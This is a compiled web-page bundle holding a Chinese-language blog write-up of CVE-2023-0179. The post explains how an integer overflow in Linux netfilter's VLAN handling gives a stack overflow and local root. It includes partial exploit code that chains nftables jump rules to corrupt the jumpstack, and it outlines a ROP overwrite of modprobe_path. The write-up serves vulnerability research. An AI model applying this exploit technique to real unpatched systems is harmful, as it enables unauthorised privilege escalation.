"use strict";(self.webpackChunkpoc_docs=self.webpackChunkpoc_docs||[]).push([[8531],{2466:(n,r,e)=>{e.r(r),e.d(r,{assets:()=>_,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var t=e(4848),s=e(8453);const a={slug:"tiangongarticle001",title:"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",authors:"limin06",tags:["Linux","Privilege Escalation"]},i="CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",c={permalink:"/blog/tiangongarticle001",editUrl:"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-10-18-cve-2023-0179-linux/index.md",source:"@site/blog/2023-10-18-cve-2023-0179-linux/index.md",title:"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",description:"0x00 \u524d\u8a00",date:"2023-10-18T00:00:00.000Z",formattedDate:"2023\u5e7410\u670818\u65e5",tags:[{label:"Linux",permalink:"/blog/tags/linux"},{label:"Privilege Escalation",permalink:"/blog/tags/privilege-escalation"}],readingTime:7.63,hasTruncateMarker:!0,authors:[{name:"lm0963",title:"\u5fae\u8f6f MSRC \u5168\u7403\u6700\u5177\u4ef7\u503c\u5b89\u5168\u7cbe\u82f1\u699c\u4e0a\u699c\u8005",imageURL:"https://tiangonglab.github.io/img/authors/lm0963.jpg",key:"limin06"}],frontMatter:{slug:"tiangongarticle001",title:"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",authors:"limin06",tags:["Linux","Privilege Escalation"]},unlisted:!1,prevItem:{title:"Microsoft Hyper-V \u865a\u62df TPM \u8bbe\u5907\u6f0f\u6d1e\u5206\u6790",permalink:"/blog/tiangongarticle002"}},_={authorsImageUrls:[void 0]},l=[{value:"0x00 \u524d\u8a00",id:"0x00-\u524d\u8a00",level:2},{value:"0x01 \u80cc\u666f",id:"0x01-\u80cc\u666f",level:2},{value:"0x02 \u6f0f\u6d1e\u6210\u56e0\uff0c\u52a0\u8fd8\u662f\u51cf",id:"0x02-\u6f0f\u6d1e\u6210\u56e0\u52a0\u8fd8\u662f\u51cf",level:2},{value:"0x03 \u6f0f\u6d1e\u5229\u7528",id:"0x03-\u6f0f\u6d1e\u5229\u7528",level:2},{value:"\u6761\u4ef6\u4e00\uff1a\u9700\u8981CAP_NET_ADMIN\u6743\u9650",id:"\u6761\u4ef6\u4e00\u9700\u8981cap_net_admin\u6743\u9650",level:3},{value:"\u6761\u4ef6\u4e8c\uff1a\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3",id:"\u6761\u4ef6\u4e8c\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3",level:3},{value:"\u6761\u4ef6\u4e09\uff1a\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a",id:"\u6761\u4ef6\u4e09\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a",level:3},{value:"0x04 \u603b\u7ed3",id:"0x04-\u603b\u7ed3",level:2}];function o(n){const r={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(r.h2,{id:"0x00-\u524d\u8a00",children:"0x00 \u524d\u8a00"}),"\n",(0,t.jsx)(r.p,{children:"2022\u5e747\u6708\u4e3a\u5929\u5e9c\u676f\u51c6\u5907\u7684Linux\u63d0\u6743\u6f0f\u6d1e\uff0c\u4f46\u662f22\u5e74\u5929\u5e9c\u676f\u6ca1\u529e\uff0c23\u5e741\u6708\u88ab\u5916\u56fd\u4eba\u62a5\u4e86\u3002"}),"\n",(0,t.jsx)(r.p,{children:"\u601d\u8def\u6765\u6e90\u4e8e\u8fd9\u7bc7\u6587\u7ae0\uff0c\u5728\u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u540e\u51b3\u5b9a\u53bb\u597d\u597d\u8fc7\u4e00\u4e0bnetfilter\u76f8\u5173\u6a21\u5757\u3002"}),"\n",(0,t.jsxs)(r.p,{children:["\u6587\u7ae0\u94fe\u63a5\uff1a",(0,t.jsx)(r.a,{href:"https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/",children:"How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables"})]}),"\n",(0,t.jsx)(r.h2,{id:"0x01-\u80cc\u666f",children:"0x01 \u80cc\u666f"}),"\n",(0,t.jsx)(r.p,{children:"\u8be5\u6f0f\u6d1e\u4f4d\u4e8eLinux\u5185\u6838\u4e2dnetfilter\u6a21\u5757\u5bf9vlan\u8fdb\u884c\u5904\u7406\u7684\u76f8\u5173\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6574\u578b\u6ea2\u51fa\u5bfc\u81f4\u7684\u6808\u6ea2\u51fa\uff0c\u6700\u540e\u662fROP\u4fee\u6539modprobe_path\u8def\u5f84\u5b8c\u6210\u63d0\u6743\uff0c\u5728Ubuntu\u4e0b\u6d4b\u8bd5\u53ef\u4ee5\u7a33\u5b9a\u89e6\u53d1\uff0c\u63d0\u6743\u6210\u529f\u7387\u767e\u5206\u4e4b\u767e\u3002"}),"\n",(0,t.jsx)(r.h2,{id:"0x02-\u6f0f\u6d1e\u6210\u56e0\u52a0\u8fd8\u662f\u51cf",children:"0x02 \u6f0f\u6d1e\u6210\u56e0\uff0c\u52a0\u8fd8\u662f\u51cf"}),"\n",(0,t.jsx)(r.p,{children:"\u4e0b\u9762\u662f\u6f0f\u6d1e\u4ee3\u7801\uff0c\u5904\u7406vlan\u76f8\u5173\u7684\u90e8\u5206\u4ee3\u7801\u3002"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"/* add vlan header into the user buffer for if tag was removed by offloads */\r\nstatic bool\r\nnft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len)\r\n{\r\n  int mac_off = skb_mac_header(skb) - skb->data;\r\n  u8 *vlanh, *dst_u8 = (u8 *) d;\r\n  struct vlan_ethhdr veth;\r\n  u8 vlan_hlen = 0;\r\n\r\n  if ((skb->protocol == htons(ETH_P_8021AD) ||\r\n       skb->protocol == htons(ETH_P_8021Q)) &&\r\n      offset >= VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN + VLAN_HLEN)\r\n    vlan_hlen += VLAN_HLEN;\r\n\r\n  vlanh = (u8 *) &veth;\r\n  if (offset < VLAN_ETH_HLEN + vlan_hlen) {\r\n    u8 ethlen = len;\r\n\r\n    if (vlan_hlen &&\r\n        skb_copy_bits(skb, mac_off, &veth, VLAN_ETH_HLEN) < 0)\r\n      return false;\r\n    else if (!nft_payload_rebuild_vlan_hdr(skb, mac_off, &veth))\r\n      return false;\r\n\r\n    if (offset + len > VLAN_ETH_HLEN + vlan_hlen)\r\n      ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;\r\n\r\n    memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);\r\n\r\n    len -= ethlen;\r\n    if (len == 0)\r\n      return true;\r\n\r\n    dst_u8 += ethlen;\r\n    offset = ETH_HLEN + vlan_hlen;\r\n  } else {\r\n    offset -= VLAN_HLEN + vlan_hlen;\r\n  }\r\n\r\n  return skb_copy_bits(skb, offset + mac_off, dst_u8, len) == 0;\r\n}\n"})}),"\n",(0,t.jsxs)(r.p,{children:["\u8fd9\u4e00\u6bb5\u4ee3\u7801\u597d\u50cf\u6709\u70b9\u95ee\u9898\uff1f",(0,t.jsx)(r.strong,{children:"\u6574\u6570\u6ea2\u51fa\uff01\uff01\uff01"})]}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"if (offset + len > VLAN_ETH_HLEN + vlan_hlen)\r\n      ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u5728\u5224\u65adif (offset + len > VLAN_ETH_HLEN + vlan_hlen)\u540e\uff0c\u5e94\u8be5\u7528offset + len\u51cf\u53bbVLAN_ETH_HLEN + vlan_hlen\uff0c\u5f88\u660e\u663e\u4ee3\u7801\u4e2d\u5c11\u4e86\u62ec\u53f7\u8fd0\u7b97\uff0c\u4fee\u590d\u8865\u4e01\u4e5f\u662f\u7b80\u5355\u7684\u5c06+\u6539\u4e3a-\u3002"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"offset + len - (VLAN_ETH_HLEN + vlan_hlen)\r\n\r\n=>\r\n\r\noffset + len - VLAN_ETH_HLEN - vlan_hlen\n"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.strong,{children:"\u6808\u6ea2\u51fa\uff01\uff01\uff01"})}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);\n"})}),"\n",(0,t.jsx)(r.p,{children:"dst_u8(rdi)\u6307\u5411\u4e0a\u5c42\u8c03\u7528\u51fd\u6570\u7684regs\u6808\u4e0a\u53d8\u91cf\uff0cvlanh(rsi)\u6307\u5411veth\u6808\u4e0a\u53d8\u91cf\uff0cethlen(rcx << 3)\u5728\u6574\u6570\u6ea2\u51fa\u540e\u4f1a\u53d8\u4e3a\u4e00\u4e2a\u8f83\u5927\u503c\u3002"}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:e(3491).A+"",width:"1720",height:"1036"})}),"\n",(0,t.jsx)(r.h2,{id:"0x03-\u6f0f\u6d1e\u5229\u7528",children:"0x03 \u6f0f\u6d1e\u5229\u7528"}),"\n",(0,t.jsx)(r.h3,{id:"\u6761\u4ef6\u4e00\u9700\u8981cap_net_admin\u6743\u9650",children:"\u6761\u4ef6\u4e00\uff1a\u9700\u8981CAP_NET_ADMIN\u6743\u9650"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"static void nfnetlink_rcv(struct sk_buff *skb)\r\n{\r\n        struct nlmsghdr *nlh = nlmsg_hdr(skb);\r\n\r\n        if (skb->len < NLMSG_HDRLEN ||\r\n            nlh->nlmsg_len < NLMSG_HDRLEN ||\r\n            skb->len < nlh->nlmsg_len)\r\n                return;\r\n\r\n        if (!netlink_net_capable(skb, CAP_NET_ADMIN)) {\r\n                netlink_ack(skb, nlh, -EPERM, NULL);\r\n                return;\r\n        }\r\n\r\n        if (nlh->nlmsg_type == NFNL_MSG_BATCH_BEGIN)\r\n                nfnetlink_rcv_skb_batch(skb, nlh);\r\n        else\r\n                netlink_rcv_skb(skb, nfnetlink_rcv_msg);\r\n}\r\n\r\nbool netlink_net_capable(const struct sk_buff *skb, int cap)\r\n{\r\n  return netlink_ns_capable(skb, sock_net(skb->sk)->user_ns, cap);\r\n}\n"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.strong,{children:"\u547d\u4ee4\u7a7a\u95f4"})}),"\n",(0,t.jsx)(r.p,{children:"Linux\u4e0b\u9ed8\u8ba4\u7684\u6839\u547d\u4ee4\u7a7a\u95f4\u662finit_user_ns\uff0c\u5982\u679cCONFIG_USER_NS\u548cCONFIG_NET_NS\u914d\u7f6e\u9009\u9879\u5f00\u542f\uff0c\u7528\u6237\u4fbf\u53ef\u4ee5\u521b\u5efa\u81ea\u5df1\u7684\u547d\u4ee4\u7a7a\u95f4\uff0c\u5e76\u4e14\u5728\u8be5\u7528\u6237\u547d\u4ee4\u7a7a\u95f4\u4e2d\u83b7\u5f97\u6240\u6709\u6743\u9650\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u65b0\u7684\u547d\u4ee4\u7a7a\u95f4\u4ee5\u6ee1\u8db3\u4e0a\u8ff0CAP_NET_ADMIN\u6743\u9650\u68c0\u67e5\u3002"}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:e(3971).A+"",width:"1127",height:"181"})}),"\n",(0,t.jsx)(r.h3,{id:"\u6761\u4ef6\u4e8c\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3",children:"\u6761\u4ef6\u4e8c\uff1a\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3"}),"\n",(0,t.jsx)(r.p,{children:"ethlen\u7684\u7c7b\u578b\u662fu8\uff0c\u90a3\u4e48\u6700\u5927\u503c\u4e3a0xff\uff0c\u5f88\u660e\u663e\u4e0d\u8db3\u4ee5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0cregs\u53d8\u91cf\u540e\u8ddf\u7740nft_jumpstack\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u957f\u5ea6\u4e3a16\uff0c\u5927\u5c0f\u4e3a256\u5b57\u8282\u3002"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"#define NFT_JUMP_STACK_SIZE  16\r\n\r\nstruct nft_jumpstack {\r\n  const struct nft_chain  *chain;\r\n  struct nft_rule  *const *rules;\r\n};\r\n\r\nunsigned int\r\nnft_do_chain(struct nft_pktinfo *pkt, void *priv)\r\n{\r\n  const struct nft_chain *chain = priv, *basechain = chain;\r\n  const struct net *net = nft_net(pkt);\r\n  struct nft_rule *const *rules;\r\n  const struct nft_rule *rule;\r\n  const struct nft_expr *expr, *last;\r\n  struct nft_regs regs;\r\n  unsigned int stackptr = 0;\r\n  struct nft_jumpstack jumpstack[NFT_JUMP_STACK_SIZE];\r\n  bool genbit = READ_ONCE(net->nft.gencursor);\r\n  struct nft_traceinfo info;\r\n\r\n......\r\nida\u53cd\u6c47\u7f16\u7ed3\u679c\r\n\r\n__int64 __fastcall nft_do_chain(\r\n        __int64 *a1,\r\n        struct nft_regs *a2,\r\n        __int64 a3,\r\n        __int64 a4,\r\n        __int64 a5,\r\n        __int64 a6,\r\n        char a7,\r\n        int a8,\r\n        __int16 a9)\r\n{\r\n  ......\r\n  struct nft_regs regs; // [rsp+60h] [rbp-190h] BYREF\r\n  struct nft_jumpstack v51[16]; // [rsp+B0h] [rbp-140h] BYREF\r\n  unsigned __int64 canary; // [rsp+1B8h] [rbp-38h]\r\n  __int64 v53; // [rsp+1C0h] [rbp-30h]\r\n  __int64 v54; // [rsp+1C8h] [rbp-28h]\r\n  __int64 v55; // [rsp+1D0h] [rbp-20h]\r\n  __int64 v56; // [rsp+1D8h] [rbp-18h]\r\n  __int64 v57; // [rsp+1E0h] [rbp-10h]\r\n  __int64 v58; // [rsp+1E8h] [rbp-8h]\n"})}),"\n",(0,t.jsx)(r.p,{children:"\u901a\u8fc7\u5229\u7528\u6539\u5199nft_jumpstack\u7ed3\u6784\u4f53\uff0c\u6269\u5927\u8d8a\u754c\u8bfb\u5199\u8303\u56f4\u3002"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:"unsigned int\r\nnft_do_chain(struct nft_pktinfo *pkt, void *priv)\r\n{\r\n  const struct nft_chain *chain = priv, *basechain = chain;\r\n  const struct net *net = nft_net(pkt);\r\n  struct nft_rule *const *rules;\r\n  const struct nft_rule *rule;\r\n  const struct nft_expr *expr, *last;\r\n  struct nft_regs regs;\r\n  unsigned int stackptr = 0;\r\n  struct nft_jumpstack jumpstack[NFT_JUMP_STACK_SIZE];\r\n  bool genbit = READ_ONCE(net->nft.gencursor);\r\n  struct nft_traceinfo info;\r\n\r\n  info.trace = false;\r\n  if (static_branch_unlikely(&nft_trace_enabled))\r\n    nft_trace_init(&info, pkt, &regs.verdict, basechain);\r\ndo_chain:\r\n  if (genbit)\r\n    rules = rcu_dereference(chain->rules_gen_1);\r\n  else\r\n    rules = rcu_dereference(chain->rules_gen_0);\r\n\r\nnext_rule:\r\n  rule = *rules;\r\n  regs.verdict.code = NFT_CONTINUE;\r\n  for (; *rules ; rules++) {\r\n    rule = *rules;\r\n    nft_rule_for_each_expr(expr, last, rule) {\r\n      if (expr->ops == &nft_cmp_fast_ops)\r\n        nft_cmp_fast_eval(expr, &regs);\r\n      else if (expr->ops == &nft_bitwise_fast_ops)\r\n        nft_bitwise_fast_eval(expr, &regs);\r\n      else if (expr->ops != &nft_payload_fast_ops ||\r\n         !nft_payload_fast_eval(expr, &regs, pkt))\r\n        expr_call_ops_eval(expr, &regs, pkt);\r\n\r\n      if (regs.verdict.code != NFT_CONTINUE)\r\n        break;\r\n    }\r\n\r\n    switch (regs.verdict.code) {\r\n    case NFT_BREAK:\r\n      regs.verdict.code = NFT_CONTINUE;\r\n      continue;\r\n    case NFT_CONTINUE:\r\n      nft_trace_packet(&info, chain, rule,\r\n           NFT_TRACETYPE_RULE);\r\n      continue;\r\n    }\r\n    break;\r\n  }\r\n\r\n  switch (regs.verdict.code & NF_VERDICT_MASK) {\r\n  case NF_ACCEPT:\r\n  case NF_DROP:\r\n  case NF_QUEUE:\r\n  case NF_STOLEN:\r\n    nft_trace_packet(&info, chain, rule,\r\n         NFT_TRACETYPE_RULE);\r\n    return regs.verdict.code;\r\n  }\r\n\r\n  switch (regs.verdict.code) {\r\n  case NFT_JUMP:\r\n    if (WARN_ON_ONCE(stackptr >= NFT_JUMP_STACK_SIZE))\r\n      return NF_DROP;\r\n    jumpstack[stackptr].chain = chain;\r\n    jumpstack[stackptr].rules = rules + 1;\r\n    stackptr++;\r\n    fallthrough;\r\n  case NFT_GOTO:\r\n    nft_trace_packet(&info, chain, rule,\r\n         NFT_TRACETYPE_RULE);\r\n\r\n    chain = regs.verdict.chain;\r\n    goto do_chain;\r\n  case NFT_CONTINUE:\r\n  case NFT_RETURN:\r\n    nft_trace_packet(&info, chain, rule,\r\n         NFT_TRACETYPE_RETURN);\r\n    break;\r\n  default:\r\n    WARN_ON(1);\r\n  }\r\n\r\n  if (stackptr > 0) {\r\n    stackptr--;\r\n    chain = jumpstack[stackptr].chain;\r\n    rules = jumpstack[stackptr].rules;\r\n    goto next_rule;\r\n  }\n"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:e(4814).A+"",width:"2000",height:"1333"})}),"\n",(0,t.jsx)(r.p,{children:(0,t.jsx)(r.img,{src:e(3790).A+"",width:"831",height:"475"})}),"\n",(0,t.jsx)(r.p,{children:"\u901a\u8fc7\u589e\u52a0\u591a\u4e2averdict.code\u4e3aNFT_JUMP\u7684\u89c4\u5219\uff0c\u5728\u89c4\u5219\u6267\u884c\u540e\u5c31\u4f1a\u586b\u5145jumpstack\u6570\u7ec4\uff0c\u5e76\u5728\u6700\u540e\u4e00\u4e2a\u89c4\u5219\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4fee\u6539jumpstack\u6570\u7ec4\uff0c\u63a7\u5236\u5176\u4e2d\u7684rules\u6307\u9488\uff0c\u540e\u7eed\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u505aROP\u5373\u53ef\u3002"}),"\n",(0,t.jsx)(r.pre,{children:(0,t.jsx)(r.code,{className:"language-javascript",children:'struct unft_base_chain_param bp;\r\n    bp.hook_num = NF_INET_PRE_ROUTING;\r\n    bp.prio = 10;\r\n\r\n    for (int i = 0; i < exp_chain_num; i++)\r\n    {\r\n        sprintf(exp_chain_name, "%s%d", "exp_chain", i);\r\n        void *p = NULL;\r\n        if (!i)\r\n             p = &bp;\r\n        if (create_chain(nl, table_name, exp_chain_name, NFPROTO_BRIDGE, p, &seq, NULL))\r\n        {\r\n            perror("Failed creating exp chain");\r\n            exit(EXIT_FAILURE);\r\n        }\r\n\r\n    }\r\n\r\n    for (int i = 0; i < exp_chain_num; i++)\r\n    {\r\n        sprintf(exp_chain_name, "%s%d", "exp_chain", i);\r\n        sprintf(exp_chain_name_next, "%s%d", "exp_chain", i+1);\r\n\r\n        struct nftnl_rule* r = build_rule(table_name, exp_chain_name, NFPROTO_BRIDGE, NULL);\r\n\r\n        if (!i){\r\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 0x16, 0x40, 1, 0);\r\n            char *cmp_str = MAGIC;\r\n            rule_add_cmp(r, NFT_CMP_EQ, 1, cmp_str, 6);\r\n\r\n            uint64_t stack_value = (stack << 16) | 0xffff;\r\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 20, 0x40, 1, 0);\r\n            rule_add_cmp(r, NFT_CMP_EQ, 12, &stack_value, 8);\r\n        }\r\n        if (i == exp_chain_num - 1)\r\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 20, 0x40, 1, 0); // trigger\r\n        else\r\n            rule_add_immediate_verdict(r, NFT_JUMP, exp_chain_name_next);\r\n\r\n        err = send_batch_request(\r\n                nl,\r\n                NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),\r\n                NLM_F_CREATE, NFPROTO_BRIDGE, (void**)&r, &seq,\r\n                NULL\r\n                );\r\n        if (err) {\r\n            puts(CLR_RED "[-] Set exp chain rule failed" CLR_RESET);\r\n            perror("");\r\n            exit(EXIT_FAILURE);\r\n        }\r\n    }\n'})}),"\n",(0,t.jsx)(r.h3,{id:"\u6761\u4ef6\u4e09\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a",children:"\u6761\u4ef6\u4e09\uff1a\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a"}),"\n",(0,t.jsx)(r.p,{children:"\u5728recv\u63a5\u6536\u6570\u636e\u65f6\u89e6\u53d1\u6f0f\u6d1e\uff0c\u6240\u4ee5\u4e0d\u786e\u5b9a\u662f\u5728\u54ea\u4e00\u4e2a\u5185\u6838\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6808\u6ea2\u51fa\u540e\u4e5f\u4e0d\u80fd\u76f4\u63a5\u8fd4\u56de\u7528\u6237\u6001\u3002"}),"\n",(0,t.jsx)(r.p,{children:"\u4e0d\u8fc7\u591a\u7834\u574f\u6808\u4e0a\u6570\u636e\uff0c\u5728\u6709\u9650\u7684\u6808\u7a7a\u95f4\u5185\u4fee\u6539modprobe_path\uff08\u5728\u8fd0\u884c\u975eELF\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u65f6\uff0c\u4f1a\u4ee5root\u6743\u9650\u8c03\u7528\u8be5\u811a\u672c\uff09\u6307\u5411\u6211\u4eec\u53ef\u63a7\u7684\u811a\u672c\uff0c\u6700\u540e\u8c03\u6574rsp\u4e3a\u4e0a\u4e00\u5c42\u672a\u7834\u574f\u7684\u6808\u5e27\uff0c\u6b63\u5e38\u8fd4\u56de\u3002"}),"\n",(0,t.jsx)(r.h2,{id:"0x04-\u603b\u7ed3",children:"0x04 \u603b\u7ed3"}),"\n",(0,t.jsx)(r.p,{children:"netfilter\u5b50\u7cfb\u7edf\u662f\u4e00\u4e2a\u76f8\u5f53\u590d\u6742\u7684\u7cfb\u7edf\uff0c\u501f\u52a9\u6b64\u6587\u4ecb\u7ecd\u4e86CVE-2023-0179\u7684\u6f0f\u6d1e\u6210\u56e0\u548c\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u6ce8\u610f\u70b9\uff0c\u5e0c\u671b\u80fd\u8d77\u5230\u629b\u7816\u5f15\u7389\u7684\u6548\u679c\u3002"})]})}function h(n={}){const{wrapper:r}={...(0,s.R)(),...n.components};return r?(0,t.jsx)(r,{...n,children:(0,t.jsx)(o,{...n})}):o(n)}},4814:(n,r,e)=>{e.d(r,{A:()=>t});const t=e.p+"assets/images/065b65c4-aa16-41fc-92f1-ed336e8ba155-3c5cf086591cf206bd6a39e95d1efbf5.jpeg"},3790:(n,r,e)=>{e.d(r,{A:()=>t});const t=e.p+"assets/images/0c63e908-6b17-4832-a95a-e2e1fb9913e4-22b849ff21dc5315798ff33fcd1c4c6e.png"},3491:(n,r,e)=>{e.d(r,{A:()=>t});const t=e.p+"assets/images/7848c444-c556-44ba-a298-91e2573502d7-0976ec7020384aea8cf1ff39ebb82f27.png"},3971:(n,r,e)=>{e.d(r,{A:()=>t});const t=e.p+"assets/images/81f59f3f-098d-4671-8167-b943b5629a35-6a41d15113b0649127129dfeb8a10b90.png"},8453:(n,r,e)=>{e.d(r,{R:()=>i,x:()=>c});var t=e(6540);const s={},a=t.createContext(s);function i(n){const r=t.useContext(a);return t.useMemo((function(){return"function"==typeof n?n(r):{...r,...n}}),[r,n])}function c(n){let r;return r=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:i(n.components),t.createElement(a.Provider,{value:r},n.children)}}}]);